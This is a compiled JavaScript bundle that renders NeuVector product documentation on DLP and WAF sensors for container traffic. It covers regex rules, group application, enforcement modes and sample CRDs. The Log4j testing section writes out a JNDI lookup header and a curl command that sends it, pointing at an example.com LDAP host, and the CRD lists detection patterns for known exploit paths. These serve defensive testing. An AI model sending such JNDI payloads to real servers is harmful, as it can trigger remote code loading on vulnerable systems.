"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[3282],{4619:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>o,metadata:()=>a,toc:()=>c});var s=t(85893),r=t(11151);const o={title:"DLP & WAF Sensors",taxonomy:{category:"docs"},slug:"/policy/dlp"},i=void 0,a={id:"policy/dlp/dlp",title:"DLP & WAF Sensors",description:"Data Loss Prevention (DLP) and Web Application Firewall (WAF)",source:"@site/docs/05.policy/09.dlp/09.dlp.md",sourceDirName:"05.policy/09.dlp",slug:"/policy/dlp",permalink:"/next/policy/dlp",draft:!1,unlisted:!1,editUrl:"https://github.com/neuvector/docs/edit/main/docs/05.policy/09.dlp/09.dlp.md",tags:[],version:"current",sidebarPosition:9,frontMatter:{title:"DLP & WAF Sensors",taxonomy:{category:"docs"},slug:"/policy/dlp"},sidebar:"tutorialSidebar",previous:{title:"Response Rules",permalink:"/next/policy/responserules"},next:{title:"Network Threat Signatures",permalink:"/next/policy/threats"}},l={},c=[{value:"Data Loss Prevention (DLP) and Web Application Firewall (WAF)",id:"data-loss-prevention-dlp-and-web-application-firewall-waf",level:3},{value:"WAF Sensors",id:"waf-sensors",level:4},{value:"DLP Sensors",id:"dlp-sensors",level:4},{value:"Configuring DLP and WAF sensors",id:"configuring-dlp-and-waf-sensors",level:4},{value:"Applying DLP/WAF Sensors to Container Groups",id:"applying-dlpwaf-sensors-to-container-groups",level:4},{value:"DLP/WAF Actions in Discover, Monitor, Protect Modes",id:"dlpwaf-actions-in-discover-monitor-protect-modes",level:4},{value:"Log4j Detection WAF Pattern",id:"log4j-detection-waf-pattern",level:4},{value:"Testing the Log4j WAF Detection",id:"testing-the-log4j-waf-detection",level:4},{value:"WAF Setup and Testing",id:"waf-setup-and-testing",level:4},{value:"Sample Alerts",id:"sample-alerts",level:4},{value:"Managing WAF Rules Using Import/Export or CRDs",id:"managing-waf-rules-using-importexport-or-crds",level:3},{value:"DLP/WAF Response Rules",id:"dlpwaf-response-rules",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",em:"em",h3:"h3",h4:"h4",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h3,{id:"data-loss-prevention-dlp-and-web-application-firewall-waf",children:"Data Loss Prevention (DLP) and Web Application Firewall (WAF)"}),"\n",(0,s.jsx)(n.p,{children:"DLP and WAF uses the Deep Packet Inspection (DPI) of NeuVector to inspect the network payloads of connections for sensitive data violations. NeuVector uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host."}),"\n",(0,s.jsx)(n.p,{children:"DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below."}),"\n",(0,s.jsx)(n.p,{children:"Configuring DLP or WAF is a two step process:"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:"Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet."}),"\n",(0,s.jsx)(n.li,{children:"Apply the desired sensor to a Group, in the Policy -> Groups screen."}),"\n"]}),"\n",(0,s.jsx)(n.h4,{id:"waf-sensors",children:"WAF Sensors"}),"\n",(0,s.jsx)(n.p,{children:"WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected."}),"\n",(0,s.jsx)(n.p,{children:"This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs."}),"\n",(0,s.jsx)(n.p,{children:"Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers)."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"waf",src:t(22337).Z+"",width:"1428",height:"665"})}),"\n",(0,s.jsx)(n.h4,{id:"dlp-sensors",children:"DLP Sensors"}),"\n",(0,s.jsx)(n.p,{children:"DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"dlp",src:t(33058).Z+"",width:"1619",height:"789"})}),"\n",(0,s.jsx)(n.h4,{id:"configuring-dlp-and-waf-sensors",children:"Configuring DLP and WAF sensors"}),"\n",(0,s.jsx)(n.p,{children:"The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:'Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the "Not Have" operator be combined in the rule with a pattern using the "Have" operator because a single pattern with "Not Have" operator will not be effective.'}),"\n",(0,s.jsx)(n.li,{children:"Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results."}),"\n",(0,s.jsx)(n.li,{children:"Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only."}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"waf",src:t(76577).Z+"",width:"1215",height:"538"})}),"\n",(0,s.jsx)(n.p,{children:"Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives."}),"\n",(0,s.jsx)(n.p,{children:"Example of a DLP rule with a Have/Not Have pattern:\nHave:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\\b3[47]\\d{2}([ -]?)(?!(\\d)\\2{5}|123456|234567|345678)\\d{6}\\1(?!(\\d)\\3{4}|12345|56789)\\d{5}\\b\n"})}),"\n",(0,s.jsx)(n.p,{children:'This produces a false positive match for "istio_agent_go_gc_duration_seconds_sum 22.378386247999998":'}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'docker exec -ti httpclient sh\n/ # curl -d "{\\"context\\": \\"istio_agent_go_gc_duration_seconds_sum 22.378386247999998\\"}" 172.17.0.5:8080/\nHello, world!\n'})}),"\n",(0,s.jsx)(n.p,{children:"Adding a Not Have pattern removes the false positive:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"istio\\_(\\w){5}\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.em,{children:(0,s.jsx)(n.strong,{children:"Sensors must be applied to a Group to become effective."})})}),"\n",(0,s.jsx)(n.h4,{id:"applying-dlpwaf-sensors-to-container-groups",children:"Applying DLP/WAF Sensors to Container Groups"}),"\n",(0,s.jsx)(n.p,{children:"To activate a DLP or WAF sensor, go to Policy -> Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s)."}),"\n",(0,s.jsx)(n.p,{children:"It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone.  For example, if the Group selected is the reserved group 'containers', and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace."}),"\n",(0,s.jsx)(n.p,{children:"It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic)."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"group",src:t(98952).Z+"",width:"1411",height:"687"})}),"\n",(0,s.jsx)("strong",{children:"DLP/WAF Behavior Summary"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group."}),"\n",(0,s.jsx)(n.li,{children:"Any traffic passing in and out of a DLP group is scanned for pattern matches."}),"\n",(0,s.jsx)(n.li,{children:"Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections."}),"\n",(0,s.jsx)(n.li,{children:"Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule)."}),"\n",(0,s.jsx)(n.li,{children:"Multiple alerts are generated for a single packet if it matches multiple rules."}),"\n",(0,s.jsx)(n.li,{children:"For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules."}),"\n",(0,s.jsx)(n.li,{children:"Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds."}),"\n",(0,s.jsx)(n.li,{children:"PCRE is used for pattern matching."}),"\n",(0,s.jsx)(n.li,{children:"Hyper scan library is used for efficient, scalable and high-performance pattern matching."}),"\n"]}),"\n",(0,s.jsx)(n.h4,{id:"dlpwaf-actions-in-discover-monitor-protect-modes",children:"DLP/WAF Actions in Discover, Monitor, Protect Modes"}),"\n",(0,s.jsx)(n.p,{children:"When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Discover mode. The action will always be to alert, regardless of the setting Alert/Deny."}),"\n",(0,s.jsx)(n.li,{children:"Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny."}),"\n",(0,s.jsx)(n.li,{children:"Protect mode. The action will be to alert if set to Alert, or block if set to Deny."}),"\n"]}),"\n",(0,s.jsx)(n.h4,{id:"log4j-detection-waf-pattern",children:"Log4j Detection WAF Pattern"}),"\n",(0,s.jsx)(n.p,{children:"The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*\n"})}),"\n",(0,s.jsx)(n.p,{children:"Also note that there are ways that attackers could bypass detection by such rules."}),"\n",(0,s.jsx)(n.h4,{id:"testing-the-log4j-waf-detection",children:"Testing the Log4j WAF Detection"}),"\n",(0,s.jsx)(n.p,{children:"In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}\n"})}),"\n",(0,s.jsx)(n.p,{children:"Using curl to POST data to server(container) can help to test WAF rule:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'curl -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d \'$SOME_DATA\' "http://$SOME_IP_:$PORT"\n'})}),"\n",(0,s.jsx)(n.h4,{id:"waf-setup-and-testing",children:"WAF Setup and Testing"}),"\n",(0,s.jsx)(n.p,{children:"The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors. The README provides instructions for running it."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:t(44435).Z+"",children:"Download WAF test script"})}),"\n",(0,s.jsx)(n.h4,{id:"sample-alerts",children:"Sample Alerts"}),"\n",(0,s.jsx)(n.p,{children:"DLP match in Discover or Monitor Mode"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"DLPAlert",src:t(68993).Z+"",width:"972",height:"375"})}),"\n",(0,s.jsx)(n.p,{children:"DLP match in Protect Mode"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"DLPProtect",src:t(96578).Z+"",width:"983",height:"418"})}),"\n",(0,s.jsx)(n.p,{children:"DLP Security Event Notification for Credit Card Match"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"DLPCredit",src:t(84884).Z+"",width:"1037",height:"262"})}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"The automated packet capture will contain the actual packet including the credit card number matched. This is also true of any DLP packet capture for any sensitive data."})}),"\n",(0,s.jsx)(n.h3,{id:"managing-waf-rules-using-importexport-or-crds",children:"Managing WAF Rules Using Import/Export or CRDs"}),"\n",(0,s.jsx)(n.p,{children:"It is possible to import or export WAF rules from the WAF screen. This can be useful to be able to propagate rules to other clusters, make a backup, or prepare them for applying as a CRD."}),"\n",(0,s.jsx)(n.p,{children:"In order to create WAF sensors or apply a WAF sensor to a group using CRDs, make sure the appropriate NVWafSecurityRule cluster role binding is created."}),"\n",(0,s.jsx)(n.p,{children:"Sample WAF sensor CRD"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:"apiVersion: v1\nitems:\n- apiVersion: neuvector.com/v1\n  kind: NvWafSecurityRule\n  metadata:\n    name: sensor.execution\n  spec:\n    sensor:\n      comment: arbitrary command execution attempt\n      name: sensor.execution\n      rules:\n      - name: Alchemy\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/NUL\\/.*\\.\\.\\/\\.\\.\\/\n      - name: Log4j\n        patterns:\n        - context: header\n          key: pattern\n          op: regex\n          value: \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*\n      - name: formmail\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/formmail\n        - context: packet\n          key: pattern\n          op: regex\n          value: \\x0a\n      - name: CCBill\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/whereami\\.cgi?.*g=\n      - name: DotNetNuke\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/Install\\/InstallWizard.aspx.*executeinstall\n      - name: HNAP\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/tmUnblock.cgi\n        - context: header\n          key: pattern\n          op: regex\n          value: 'Authorization: Basic\\s*YWRtaW46'\n      - name: Magento\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/Adminhtml_.*forwarded=\n      - name: b2\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/b2\\/b2-include\\/.*b2inc.*http\\x3a\\/\\/\n      - name: bat\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: x2ebat\\x22.*?\\x26\n      - name: eshop.pl\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/eshop\\.pl?.*seite=\\x3b\n      - name: whois_raw.cgi\n        patterns:\n        - context: url\n          key: pattern\n          op: regex\n          value: \\/whois_raw\\.cgi?\n        - context: packet\n          key: pattern\n          op: regex\n          value: \\x0a\nkind: List\nmetadata: null\n"})}),"\n",(0,s.jsx)(n.p,{children:"Sample CRD to apply a WAF sensor to a Group"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'apiVersion: v1\nitems:\n- apiVersion: neuvector.com/v1\n  kind: NvSecurityRule\n  metadata:\n    name: demo-group\n    namespace: demo\n  spec:\n    egress: []\n    file: []\n    ingress: []\n    process: []\n    process_profile:\n      baseline: default\n    target:\n      policymode: N/A\n      selector:\n        comment: ""\n        criteria:\n        - key: domain\n          op: =\n          value: demo\n        - key: service\n          op: =\n          value: nginx-pod.demo\n        - key: service\n          op: =\n          value: node-pod.demo\n        name: demo-group\n        original_name: ""\n    waf:\n      settings:\n      - action: deny\n        name: sensor.cross\n      - action: deny\n        name: sensor.execution\n      - action: deny\n        name: sensor.injection\n      - action: deny\n        name: sensor.traversal\n      - action: deny\n        name: wafsensor-1\n      status: true\nkind: List\nmetadata: null\n'})}),"\n",(0,s.jsxs)(n.p,{children:["See the ",(0,s.jsx)(n.a,{href:"/policy/usingcrd",children:"CRD section"})," for more details on working with CRDs."]}),"\n",(0,s.jsx)(n.h3,{id:"dlpwaf-response-rules",children:"DLP/WAF Response Rules"}),"\n",(0,s.jsx)(n.p,{children:"Response rules based on DLP/WAF security events can be created in Policy ->Response Rules. Start type DLP or WAF and the dropdown will list all sensors and patterns available to create rules."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"DLPResponse",src:t(50374).Z+"",width:"1068",height:"381"})})]})}function p(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},44435:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/files/waf_test-b54bc5fa9530dc205ac4c3b7e6e7e82f.zip"},76577:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/5_sensor_config-c0642c5803a8e37377fb1e17c9b6d4ea.png"},98952:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/apply_dlp_group-da6b7e3b209cc27db3d61e2fa4ca72ac.png"},68993:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/dlp4_alert_discover-9b7d581c0e8af16556833d3ef275f7a6.png"},84884:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/dlp6_credit-9be9630a0d2a6ffdf4b40f07ac474044.png"},50374:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/dlp7_response-9ad13780c64d147807d0ca25bceffc47.png"},96578:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/dlp_5_protect-8e745e938aba09367160c874eb4d698b.png"},33058:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/sensors-2c5b2900bb2bfb4781af089698e2d55a.png"},22337:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/waf_sensors-c1730d77ce4ccc7de195af1197746912.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>a,a:()=>i});var s=t(67294);const r={},o=s.createContext(r);function i(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);